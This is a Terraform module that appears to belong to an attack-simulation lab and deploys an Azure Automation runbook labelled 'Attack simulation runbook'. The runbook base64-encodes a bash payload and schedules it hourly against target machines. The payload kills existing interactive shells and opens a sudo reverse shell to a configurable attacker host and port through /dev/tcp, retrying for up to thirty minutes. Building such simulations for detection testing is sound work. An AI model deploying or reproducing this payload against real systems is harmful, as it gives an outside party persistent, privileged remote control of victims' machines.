
locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    MAX_WAIT=1800
    SECONDS_WAITED=0
    CHECK_INTERVAL=5

    LOGFILE=/tmp/runbook_attacker_exec_reverseshell_target.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    check_apt() {
        pgrep -f "apt" || pgrep -f "dpkg"
    }
    while check_apt; do
        log "Waiting for apt to be available..."
        sleep 10
    done
    log "attacker Host: ${local.host_ip}:${local.host_port}"
    server="${local.host_ip}"
    timeout=600
    start_time=$(date +%s)
    # Check if $server is an IP address
    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "server is set to IP address $server, no need to resolve DNS"
    else
        log "checking dns resolution: $server"
        while true; do
            ip=$(dig +short $server)
            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
                current_time=$(date +%s)
                elapsed_time=$((current_time - start_time))
                if [ $elapsed_time -gt $timeout ]; then
                    echo "DNS resolution for $server timed out after $timeout seconds"
                    exit 1
                fi
                sleep 1
            else
                echo "$server resolved to $ip"
                break
            fi
        done
    fi
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    log "running: sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
    
    log "reconnecting: ${local.host_ip}:${local.host_port}"
    while ! sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
        log "reconnecting: ${local.host_ip}:${local.host_port}";
        
        SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
        if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
            log "Connection is still not available after waiting for $((MAX_WAIT / 60)) minutes."
            exit 1
        fi
        sleep $CHECK_INTERVAL;
    done;
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# RUNBOOK
#####################################################

locals {
    automation_account_name = var.automation_account
}


data "azurerm_subscription" "current" {
}

#####################################################
# RESOURCE GROUP RUNBOOK
#####################################################

locals {
    resource_name = "${replace(var.tag, "_", "-")}-${var.environment}-${var.deployment}-${random_string.this.id}"
}

resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

resource "azurerm_automation_runbook" "demo_rb" {
    name                    = "${var.tag}-${var.environment}-${var.deployment}-${random_string.this.id}"
    location                = var.resource_group.location
    resource_group_name     = var.resource_group.name
    automation_account_name = var.automation_account
    log_verbose             = "true"
    log_progress            = "true"
    description             = "Attack simulation runbook"
    runbook_type            = "Script"
    content                 = templatefile(pathexpand("${path.module}/runbooks/powershell/RunCommand.ps1"), {
                                subscription            = data.azurerm_subscription.current.subscription_id
                                resource_group          = var.resource_group.name
                                automation_account      = var.automation_princial_id
                                base64_payload          = local.base64_payload
                                module_name             = basename(abspath(path.module))
                                tag                     = var.tag
                            })
}

resource "azurerm_automation_schedule" "hourly" {
  name                    = "${var.tag}-schedule-${var.environment}-${var.deployment}_${random_string.this.id}"
  resource_group_name     = var.resource_group.name
  automation_account_name = var.automation_account
  frequency               = "Hour"
  interval                = 1
  timezone                = "UTC"
  description             = "Run every hour"
  start_time              = timeadd(timestamp(), "10m")
}

resource "azurerm_automation_job_schedule" "demo_sched" {
    resource_group_name     = var.resource_group.name
    automation_account_name = var.automation_account
    schedule_name           = azurerm_automation_schedule.hourly.name
    runbook_name            = azurerm_automation_runbook.demo_rb.name
    depends_on              = [azurerm_automation_schedule.hourly]
}